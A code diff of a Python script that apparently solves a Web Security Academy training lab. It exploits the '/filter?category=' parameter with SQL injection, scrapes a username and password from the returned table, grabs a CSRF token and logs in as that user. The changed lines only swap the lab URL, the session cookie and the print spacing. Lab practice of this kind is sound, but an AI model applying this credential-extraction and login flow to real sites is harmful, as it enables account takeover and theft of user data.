@@ -19,8 +19,8 @@ from bs4 import BeautifulSoup
 #
 
 #modify here ---------
-baseURL = "https://0a9e006904f4af04c04448d1007300ae.web-security-academy.net"
-cookies = {'session':'JilOMVkb4OuKzqxTfnJrUqAS43CxuvqY'}
+baseURL = "https://0a75006804031dc4c0ff014100c200a8.web-security-academy.net"
+cookies = {'session':'FJOGlfbZRGHVP4LGC3V91vJ933zhV8vt'}
 #modify end ----------
 
 exploitURL = baseURL + "/filter?category="
@@ -47,8 +47,8 @@ for row in table.tbody.find_all('tr'):
 			username = row.find('th').text.strip()
 			password = row.find('td').text.strip()
 
-print("		[+] username: {}".format(username))
-print("		[+] password: {}".format(password))
+print(" [+] username: {}".format(username))
+print(" [+] password: {}".format(password))
 
 #https://0aea00b004101da9c0db297000910086.web-security-academy.net/login
    # <section>
@@ -61,7 +61,7 @@ print("finding csrf token... ")
 html_content = requests.get(url = loginURL, cookies=cookies).text
 soup = BeautifulSoup(html_content, "html.parser")
 csrf_token = soup.find('input', {'name':'csrf'})['value']
-print("		[+] csrf token found! : {}".format(csrf_token))
+print(" [+] csrf token found! : {}".format(csrf_token))
 
 print("\nLoggin in... ")
 
@@ -73,4 +73,4 @@ res = requests.post(url = loginURL, data = data, cookies=cookies)
 
 #if login is successful you will see 'Log out' 
 if "Log out" in res.text:
-	print("[+] Successfully logged in!")
+	print(" [+] Successfully logged in!")
